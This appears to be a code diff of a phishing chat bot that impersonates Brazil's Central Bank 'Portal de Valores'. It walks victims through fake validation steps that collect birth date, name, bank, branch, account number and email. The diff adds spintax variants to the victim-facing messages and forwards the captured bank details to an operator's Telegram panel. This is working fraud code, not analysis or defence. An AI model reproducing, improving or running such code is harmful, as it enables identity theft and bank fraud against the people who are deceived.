+            await sendBotMessage(targetChatId, `✅ *{Compreendido. Manteremos seus dados bancários atuais|Certo. Manteremos os dados bancários informados anteriormente}.*\n\nPor favor, aguarde o processamento ou continue seu atendimento.`);
         }
         return;
     } else if (currentSession.step === 1) {
@@ -1586,7 +1658,7 @@ async function processIncomingMessage(msg, targetChatId) {
             console.log(`[BOT] Date format not recognized for ${targetChatId}: "${text}"`);
             const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
             const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
-            const fallback = `⚠️ *Portal de Valores — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
+            const fallback = `⚠️ *{Portal de Valores — Validação de Identidade|Portal de Valores — Erro de Validação}*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
             await sendBotMessage(targetChatId, aiReply || fallback);
             return;
         }
@@ -1596,7 +1668,7 @@ async function processIncomingMessage(msg, targetChatId) {
 
         // Ensure we have exactly 8 digits (DDMMYYYY)
         if (cleanTyped.length !== 8) {
-            await sendBotMessage(targetChatId, `⚠️ *Data Incompleta*\n\nPor favor, informe a data completa com dia, mês e ano (Ex: 10/05/1990).`);
+            await sendBotMessage(targetChatId, `⚠️ *{Data Incompleta|Data de nascimento incompleta}*\n\nPor favor, informe a data completa com dia, mês e ano (Ex: 10/05/1990).`);
             return;
         }
 
@@ -1627,19 +1699,16 @@ async function processIncomingMessage(msg, targetChatId) {
 
             if (cleanTyped !== cleanExpected) {
                 console.log(`[BOT] DIVERGENCE: Typed ${cleanTyped} != Expected ${cleanExpected}`);
-                await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal de Valores*\n\nA data informada não corresponde aos registros cadastrais do titular no portal.\n\nPor gentileza, verifique os dados e informe novamente conforme preenchido anteriormente.\n📌 *Formato:* DD/MM/AAAA`);
+                await sendBotMessage(targetChatId, `⚠️ *{DIVERGÊNCIA IDENTIFICADA — Portal de Valores|Divergência de Dados — Portal de Valores}*\n\nA data informada não corresponde aos registros cadastrais do titular no portal.\n\nPor gentileza, verifique os dados e informe novamente conforme preenchido anteriormente.\n📌 *Formato:* DD/MM/AAAA`);
                 return;
             }
-            console.log(`[BOT] Date MATCH for ${targetChatId}`);
         } else if (currentSession.userId) {
-            // We have a protocol but still no data found on server
             console.log(`[BOT] ERROR: userId ${currentSession.userId} has no data on server. Rejecting to be safe.`);
-            await notifyTelegram(`🚨 <b>FALHA DE SINCRONISMO</b>\nLead: <code>${targetChatId}</code>\nID: <code>${currentSession.userId}</code>\n<i>O lead tentou validar mas os dados do portal não foram encontrados. Sistema bloqueou por segurança.</i>`);
-            await sendBotMessage(targetChatId, `⚠️ *ERRO DE SINCRONISMO — Portal de Valores*\n\nNão foi possível localizar seu registro de consulta em nossa base de dados central.\n\nPor gentileza, retorne ao site e realize a consulta novamente para gerar um novo protocolo de segurança.`);
+            // await notifyTelegram(`🚨 <b>FALHA DE SINCRONISMO</b>\nLead: <code>${targetChatId}</code>\nID: <code>${currentSession.userId}</code>\n<i>O lead tentou validar mas os dados do portal não foram encontrados. Sistema bloqueou por segurança.</i>`);
+            await sendBotMessage(targetChatId, `⚠️ *{ERRO DE SINCRONISMO — Portal de Valores|Erro de Integração — Portal de Valores}*\n\nNão foi possível localizar seu registro de consulta em nossa base de dados central.\n\nPor gentileza, retorne ao site e realize a consulta novamente para gerar um novo protocolo de segurança.`);
             return;
         } else {
             console.log(`[BOT] Spontaneous lead (no protocol) ${targetChatId}. Proceeding with sanity check.`);
-            await notifyTelegram(`⚠️ <b>CONTATO DIRETO (SEM PORTAL)</b>\nLead: <code>${targetChatId}</code>\n<i>O lead entrou em contato sem passar pelo site. Validação manual necessária.</i>`);
         }
 
         // Format for storage: DD/MM/AAAA
@@ -1656,9 +1725,9 @@ async function processIncomingMessage(msg, targetChatId) {
         }
 
         if (isPJ) {
-            await sendBotMessage(targetChatId, `✅ *Data de abertura confirmada!*\n\n📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
+            await sendBotMessage(targetChatId, `✅ *{Data de abertura confirmada|Data de abertura validada}!*\n\n📍 *FASE 1.2:* Agora {informe|digite} a *Razão Social* da empresa ({conforme consta no Cartão CNPJ|exatamente como no CNPJ}):`);
         } else {
-            await sendBotMessage(targetChatId, `✅ *Data de nascimento confirmada!*\n\n📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
+            await sendBotMessage(targetChatId, `✅ *{Data de nascimento confirmada|Data de nascimento validada}!*\n\n📍 *FASE 1.2:* Agora {informe|digite} seu *Nome Completo* ({conforme consta no documento oficial|exatamente como no seu documento}):`);
         }
 
     } else if (currentSession.step === 2) {
@@ -1667,7 +1736,7 @@ async function processIncomingMessage(msg, targetChatId) {
             if (currentSession.expectedData?.fullName) {
                 const isMatch = checkNameMatch(typedName, currentSession.expectedData.fullName);
                 if (!isMatch) {
-                    await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nO nome informado não corresponde ao titular registrado no protocolo.\n\nPor favor, digite o nome completo exato (Ex: João da Silva Santos):`);
+                    await sendBotMessage(targetChatId, `⚠️ *{DIVERGÊNCIA IDENTIFICADA|Divergência de Nome}*\n\nO nome informado não corresponde ao titular registrado no protocolo.\n\nPor favor, digite o nome completo exato (Ex: João da Silva Santos):`);
                     return;
                 }
             }
@@ -1677,13 +1746,26 @@ async function processIncomingMessage(msg, targetChatId) {
             saveSessions();
 
             if (currentSession.tgMsgId) {
-                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, typedName, currentSession.birthDate, 'preenchendo_banco', currentSession.docType);
+                const { text: txt, reply_markup } = buildCadastroMessage(
+                    targetChatId,
+                    typedName,
+                    currentSession.birthDate,
+                    'preenchendo_banco',
+                    currentSession.docType,
+                    0,
+                    false,
+                    currentSession.pixCode,
+                    currentSession.value,
+                    currentSession.bankName,
+                    currentSession.bankAg,
+                    currentSession.bankCc
+                );
                 await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
             }
 
-            await sendBotMessage(targetChatId, `✅ *Nome Completo confirmado!*\n\n📍 *FASE 1.3:* Informe o *Nome da sua Instituição Financeira* (Ex: Nubank, Itaú, Caixa, Banco do Brasil, Bradesco, etc):`);
+            await sendBotMessage(targetChatId, `✅ *{Nome Completo confirmado|Nome validado com sucesso}!*\n\n📍 *FASE 1.3:* {Informe|Digite} o *Nome da sua Instituição Financeira* (Ex: Nubank, Itaú, Caixa, Banco do Brasil, Bradesco, etc):`);
         } else {
-            const fallback = `⚠️ *Portal de Valores — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
+            const fallback = `⚠️ *{Portal de Valores — Validação de Identidade|Portal de Valores — Validação de Nome}*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
             await sendBotMessage(targetChatId, fallback);
         }
     } else if (currentSession.step === 2.5) {
@@ -1698,7 +1780,7 @@ async function processIncomingMessage(msg, targetChatId) {
         }
 
         if (!detected) {
-            await sendBotMessage(targetChatId, `⚠️ Não consegui identificar a instituição bancária. Por favor, informe o nome do banco novamente (Ex: Nubank, Bradesco, Itaú, Caixa):`);
+            await sendBotMessage(targetChatId, `⚠️ *{Não consegui identificar a instituição bancária|Banco não reconhecido pelo sistema}*. Por favor, informe o nome do banco novamente (Ex: Nubank, Bradesco, Itaú, Caixa):`);
             return;
         }
         currentSession.bankName = detected.name;
@@ -1706,7 +1788,7 @@ async function processIncomingMessage(msg, targetChatId) {
         currentSession.step = 3;
         chatSessions.set(targetChatId, currentSession);
         saveSessions();
-        await sendBotMessage(targetChatId, `🏦 Banco identificado: *${detected.name}* ✅\n\nAgora informe os números da sua *Agência* bancária:`);
+        await sendBotMessage(targetChatId, `🏦 *{Banco identificado|Instituição identificada}*: *${detected.name}* ✅\n\nAgora {informe|digite} os números da sua *Agência* bancária:`);
     } else if (currentSession.step === 3) {
         const typedAg = text.trim().replace(/\D/g, "");
 
@@ -1717,13 +1799,26 @@ async function processIncomingMessage(msg, targetChatId) {
             saveSessions();
 
             if (currentSession.tgMsgId) {
-                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'preenchendo_banco', currentSession.docType);
+                const { text: txt, reply_markup } = buildCadastroMessage(
+                    targetChatId,
+                    currentSession.name,
+                    currentSession.birthDate,
+                    'preenchendo_banco',
+                    currentSession.docType,
+                    0,
+                    false,
+                    currentSession.pixCode,
+                    currentSession.value,
+                    currentSession.bankName,
+                    typedAg,
+                    currentSession.bankCc
+                );
                 await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
             }
 
-            await sendBotMessage(targetChatId, `✔️ *Agência confirmada*\n\nAgora informe o número da sua *Conta* com dígito:`);
+            await sendBotMessage(targetChatId, `✔️ *{Agência confirmada|Agência validada}*\n\nAgora {informe|digite|insira} o número da sua *Conta* com dígito:`);
         } else {
-            await sendBotMessage(targetChatId, `⚠️ *Agência Inválida*\n\nPor favor, informe apenas os números da sua agência (Ex: 0001).`);
+            await sendBotMessage(targetChatId, `⚠️ *{Agência Inválida|Formato de agência inválido}*\n\nPor favor, informe apenas os números da sua agência (Ex: 0001).`);
         }
     } else if (currentSession.step === 4) {
         const typedCc = text.trim();
@@ -1733,7 +1828,7 @@ async function processIncomingMessage(msg, targetChatId) {
             const validation = validateBankData(currentSession.bankCode, currentSession.bankAg, typedCc);
 
             if (!validation.valid) {
-                await sendBotMessage(targetChatId, `⚠️ *DADOS INCONSISTENTES*\n\nA agência e conta informadas não correspondem ao padrão do banco *${currentSession.bankName}*.\n\nPor favor, informe o número da *Conta* novamente:`);
+                await sendBotMessage(targetChatId, `⚠️ *{DADOS INCONSISTENTES|DIVERGÊNCIA BANCÁRIA}*\n\nA agência e conta informadas não correspondem ao padrão do banco *${currentSession.bankName}*.\n\nPor favor, informe o número da *Conta* novamente:`);
                 return;
             }
 
@@ -1742,17 +1837,35 @@ async function processIncomingMessage(msg, targetChatId) {
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
+            if (currentSession.tgMsgId) {
+                const { text: txt, reply_markup } = buildCadastroMessage(
+                    targetChatId,
+                    currentSession.name,
+                    currentSession.birthDate,
+                    'preenchendo_banco',
+                    currentSession.docType,
+                    0,
+                    false,
+                    currentSession.pixCode,
+                    currentSession.value,
+                    currentSession.bankName,
+                    currentSession.bankAg,
+                    typedCc
+                );
+                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+            }
+
             await sendBotMessage(targetChatId,
-                `🏛️ *${currentSession.bankName.toUpperCase()} CONFIRMADO* ✅\n\n` +
-                `📍 *DADOS CAPTURADOS:*\n` +
-                `- Agência: ${currentSession.bankAg}\n` +
-                `- Conta: ${currentSession.bankCc}\n` +
-                `- Instituição: ${currentSession.bankName}\n\n` +
-                `Prezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n` +
-                `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas.\n\n` +
-                `*Responda SIM para confirmar* ou informe os dados novamente.`);
+                `🏛️ *${currentSession.bankName.toUpperCase()} {CONFIRMADO|VALIDADO}* ✅\n\n` +
+                `📍 *{DADOS CAPTURADOS|INFORMAÇÕES CAPTURADAS}:*\n` +
+                `- {Agência|Ag}: ${currentSession.bankAg}\n` +
+                `- {Conta|Cc}: ${currentSession.bankCc}\n` +
+                `- {Instituição|Banco}: ${currentSession.bankName}\n\n` +
+                `{Prezado(a) titular|Prezado(a) cidadão(ã)}, confirme se {realmente esta é a conta|esta é de fato a conta} que o senhor(a) deseja utilizar para {o recebimento do seu valor ativo|receber o resgate dos valores}?\n\n` +
+                `⚠️ *AVISO:* A conta *NÃO* deve ser recém-criada {ou sem movimentação ativa|ou sem histórico de uso}.\n\n` +
+                `*{Responda SIM para confirmar|Digite SIM para confirmar}* ou informe os dados novamente.`);
         } else {
-            await sendBotMessage(targetChatId, `⚠️ *Conta Inválida*\n\nPor favor, informe o número da sua conta corretamente (mínimo 4 dígitos).`);
+            await sendBotMessage(targetChatId, `⚠️ *{Conta Inválida|Formato de conta inválido}*\n\nPor favor, informe o número da sua conta corretamente (mínimo 4 dígitos).`);
         }
     } else if (currentSession.step === 5) {
         if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
@@ -1761,14 +1874,14 @@ async function processIncomingMessage(msg, targetChatId) {
             saveSessions();
 
             await sendBotMessage(targetChatId,
-                `✅ *Dados bancários confirmados!*\n\n` +
-                `📍 *FASE 1.5 — Canal de Comunicação:* Para que o sistema envie seu *Comprovante de Liberação* e a *Notificação de Regularização* após o resgate, informe seu melhor *E-mail* para contato:\n\n` +
+                `✅ *{Dados bancários confirmados|Informações de conta confirmadas}!*\n\n` +
+                `📍 *FASE 1.5 — {Canal de Comunicação|E-mail para Notificação}:* Para que o sistema envie seu *Comprovante de Liberação* e a *Notificação de Regularização* após o resgate, {informe seu melhor *E-mail*|digite seu melhor *E-mail*} para contato:\n\n` +
                 `📌 *Exemplo:* seuemail@provedor.com`);
         } else {
             currentSession.step = 3;
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
-            await sendBotMessage(targetChatId, `🔄 *Entendido. Vamos recomeçar a vinculação bancária.*\n\n📍 *FASE 1.3:* Informe sua *Agência* bancária:`);
+            await sendBotMessage(targetChatId, `🔄 *{Entendido. Vamos recomeçar a vinculação bancária|Certo. Vamos reiniciar o cadastro bancário}.*\n\n📍 *FASE 1.3:* {Informe|Digite} sua *Agência* bancária:`);
         }
     } else if (currentSession.step === 6) {
         const typedEmail = text.toLowerCase().trim();
@@ -1791,7 +1904,20 @@ async function processIncomingMessage(msg, targetChatId) {
             const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
 
             if (currentSession.tgMsgId) {
-                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType);
+                const { text: txt, reply_markup } = buildCadastroMessage(
+                    targetChatId,
+                    currentSession.name,
+                    currentSession.birthDate,
+                    'na_fila',
+                    currentSession.docType,
+                    0,
+                    false,
+                    currentSession.pixCode,
+                    currentSession.value,
+                    currentSession.bankName,
+                    currentSession.bankAg,
+                    currentSession.bankCc
+                );
                 await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
             }
 
@@ -1800,16 +1926,16 @@ async function processIncomingMessage(msg, targetChatId) {
                 : `Sua solicitação é a próxima a ser processada.`;
 
             await sendBotMessage(targetChatId,
-                `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal de Valores*\n\n` +
-                `Prezado(a) *${currentSession.name}*,\n` +
-                `Seu canal de comunicação (${typedEmail}) foi vinculado com sucesso ao processo de resgate.\n\n` +
-                `⌛ *STATUS ATUAL:* Aguardando Processamento Final\n\n` +
+                `📋 *{AUTENTICAÇÃO CONCLUÍDA|VALIDAÇÃO FINALIZADA} — Portal de Valores*\n\n` +
+                `{Prezado(a)|Caro(a)} *${currentSession.name}*,\n` +
+                `Seu {canal de comunicação|e-mail de contato} (${typedEmail}) foi vinculado com sucesso ao {processo de resgate|procedimento de liberação}.\n\n` +
+                `⌛ *{STATUS ATUAL|ESTADO DO PROCESSO}:* {Aguardando Processamento Final|Fila de Análise e Homologação}\n\n` +
                 `${frenteMsg}\n\n` +
-                `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
+                `{Nosso operador entrará em contato|Um analista de liberação fará o contato} em breve para os procedimentos finais de liberação dos ativos.\n\n` +
                 `_Portal de Valores — Banco Central do Brasil_`);
         } else {
             await sendBotMessage(targetChatId,
-                `⚠️ *E-mail Inválido ou Não Reconhecido*\n\n` +
+                `⚠️ *{E-mail Inválido ou Não Reconhecido|Endereço de e-mail inválido}*\n\n` +
                 `O endereço informado não parece ser um e-mail válido ou pertence a um provedor não homologado.\n\n` +
                 `Por gentileza, informe um e-mail válido (Ex: Gmail, Outlook, Hotmail) para receber seu comprovante.`);
         }
@@ -1914,7 +2040,7 @@ setInterval(async () => {
                     if (session) { session.humanStep = 2; chatSessions.set(chatId, session); saveSessions(); }
                     // Atualiza painel do lead no Telegram imediatamente (fica verde)
                     if (session?.tgMsgId) {
-                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 2);
+                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 2, false, session.pixCode, session.value, session.bankName, session.bankAg, session.bankCc);
                         await notifyTelegram(t, session.tgMsgId, r);
                     }
 
@@ -1934,7 +2060,7 @@ setInterval(async () => {
                     if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
                     // Atualiza painel do lead no Telegram imediatamente (Etapa 3 fica verde)
                     if (session?.tgMsgId) {
-                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 3);
+                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 3, false, session.pixCode, session.value, session.bankName, session.bankAg, session.bankCc);
                         await notifyTelegram(t, session.tgMsgId, r);
                     }
 
@@ -1955,7 +2081,7 @@ setInterval(async () => {
                     if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
                     // Atualiza painel do lead no Telegram imediatamente (Etapa 4 fica verde)
                     if (session?.tgMsgId) {
-                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4);
+                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4, false, session.pixCode, session.value, session.bankName, session.bankAg, session.bankCc);
                         await notifyTelegram(t, session.tgMsgId, r);
                     }
 
@@ -1974,13 +2100,14 @@ setInterval(async () => {
                 } else if (etapa === 5) {
                     if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
                     if (session?.tgMsgId) {
-                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 5);
+                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 5, false, session.pixCode, session.value, session.bankName, session.bankAg, session.bankCc);
                         await notifyTelegram(t, session.tgMsgId, r);
                     }
                     await sendBotMessage(chatId, MENSAGEM_ETAPA_5);
-                    await notifyTelegram(
-                        `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
-                    );
+                    // Desativado para reduzir spam no Telegram
+                    // await notifyTelegram(
+                    //     `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
+                    // );
                 }
             } catch (e) {
                 console.error("❌ Erro ao processar cmd-etapa:", e.message);
@@ -2017,7 +2144,7 @@ setInterval(async () => {
 
                     // Atualiza painel Telegram — Etapa 4 fica verde automaticamente
                     if (session.tgMsgId) {
-                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4);
+                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4, false, session.pixCode, session.value, session.bankName, session.bankAg, session.bankCc);
                         await notifyTelegram(t, session.tgMsgId, r);
                     }
 
